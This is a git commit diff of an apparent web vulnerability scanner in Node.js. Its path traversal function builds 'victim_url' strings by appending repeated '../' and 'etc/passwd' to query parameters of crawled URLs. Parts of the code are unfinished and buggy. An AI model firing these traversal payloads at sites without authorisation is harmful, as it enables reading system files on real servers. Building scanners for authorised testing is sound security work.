91380152cdb5ae3639897315d32e604e230b6c37
KILKAT_NOTEBOOK <rhkddns3459@naver.com>
2023-05-18 16:44:41 +0900

    2023-05-18_kilkat

--- controllers/scan.ctrl.js
+++ controllers/scan.ctrl.js
@@ -65,6 +65,9 @@ const pathtraversal_scan = async(req, res) => {
   const url = req.body.href;
   const payload = "../";
   let success_url = [];
+  let position;
+  let match;
+  const regexp = /=/g;
   const outputFileName = 'site_tree.txt';
 
     // for (let i =0; i < 10; i++) {
@@ -82,14 +85,20 @@ const pathtraversal_scan = async(req, res) => {
           console.log('1');
 
           for(let i in site_tree){
-            const match1 = site_tree[i].indexOf('?');
-            const match2 = site_tree[i].indexOf('=');
+            const match1 = site_tree[i].indexOf("?");
+            const match2 = site_tree[i].indexOf("=");
+            const match3 = site_tree[i].match(regexp);
+            const match4 = site_tree[i].indexOf("&");
 
-            if(match1 !== -1 && match2 !== -1){
+            // console.log(match3);
+
+            if(match1 !== -1 && match2.length !== -1 && match3.length < 2 && match4 == -1){
               scan_payload = payload.repeat(10) + "etc/passwd"
-              console.log(scan_payload);
-              console.log('2')
-              let victim_url = site_tree.substr(0, match2 + 1) + scan_payload;
+              // console.log(scan_payload);
+              // console.log('2')
+              let victim_url = site_tree[i].substr(0, match2 + 1) + scan_payload;
+
+              // while((match2 = regexp.exec()))
 
               console.log(victim_url);
 
@@ -112,7 +121,21 @@ const pathtraversal_scan = async(req, res) => {
               // }
               // console.log(victim_url);
               // console.log("-------------------------------------------------------------------------------");
-            }else{
+            }else if(match1 !== -1 && match2.length !== -1 && match3.length > 1 && match4 !== -1){
+
+              scan_payload = payload.repeat(10) + "etc/passwd"
+
+              while ((match = regexp.exec(site_tree[i])) !== null) {
+                position = match.index;
+              }
+              console.log(position);
+
+              //위치 계산해서 payload 합치면됨
+
+              // console.log(victim_url);
+
+            }
+            else{
               console.log('query가 발견되지 않았습니다.');
             }
           }
